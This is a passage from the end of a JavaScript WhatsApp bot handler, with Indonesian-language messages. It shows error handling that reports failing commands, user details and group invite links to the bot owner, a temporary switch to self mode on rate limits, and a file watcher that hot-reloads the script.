                return await conn.sendText(dev.key.remoteJid, teks, dev)
            }
            await conn.sendText(Ownerin, `]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${botName}`, dev)
            if (autoblockcmd) {
                addblockcmd(command, listcmdblock)
                await reply("Command telah di block karena terjadi error")
            }
            if (autoReport) {
                if (isQuotedImage) {
                    var media = "Reply Image ✅"
                } else if (isQuotedVideo) {
                    var media = "Reply Video ✅"
                } else if (isQuotedSticker) {
                    var media = "Reply Sticker ✅"
                } else if (isQuotedAudio) {
                    var media = "Reply Audio ✅"
                } else if (isQuotedTeks) {
                    var media = "Reply Teks ✅"
                } else if (isQuotedTag) {
                    var media = "Reply Tag ✅"
                } else {
                    var media = "No Quoted ❌"
                }

                if (q.length > "0") {
                    var tetek = q
                } else if (q.length == "0") {
                    var tetek = "No Query ❌"
                }
                if (isGroup && isBotGroupAdmins) {
                    let linkgc = await conn.groupInviteCode(from)
                    var yeh = `https://chat.whatsapp.com/${linkgc}`
                } else if (isGroup && !isBotGroupAdmins) {
                    var yeh = `Bot Is Not Admin`
                } else if (!isGroup) {
                    var yeh = `Bot Is Not In The Group`
                }

                let teks = `\n*]───── 「 Report Bug ⚠️」 ─────[*\n\n👤 Name : ${pushname}\n📳 Number : wa.me/${senderNumber}\n📢 Report Info :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'Of private chat'}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`

                conn.sendText(Ownerin, teks, dev)
         }
  }
    } catch (err) {
        console.log(chalk.bgRed(color("[  ERROR  ]", "black")), util.format(err))
        let e = String(err)
        if (e.includes("this.isZero")) {
            return
        }
        if (e.includes("rate-overlimit")) {
            if (!publik) return
            publik = false
            await conn.sendMessage(botNumber + "@s.whatsapp.net", {
                text: `Rate-overlimit occurred
The bot has switched from public mode to Self mode
To avoid excessive spam,
Please wait 1 minute until all messages
have been read by the bot`
            })
            await setTimeout(() => {
                publik = true
                conn.sendMessage(botNumber + "@s.whatsapp.net", {
                    text: `Successfully changed self mode to public mode`
                })
            }, 60000)
            return
        }
        if (e.includes('Connection Closed')) {
            return
        }
        if (e.includes('Timed Out')) {
            return
        }
        if (e.includes('Value not found')) {
            return
        }
        console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green'))
        if (Console) {
            conn.sendMessage(Ownerin, {
                text: util.format(e)
            })
        }
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.bgGreen(color("[  UPDATE ]", "black")), chalk.white(`${__filename}`))
    delete require.cache[file]
    require(file)
})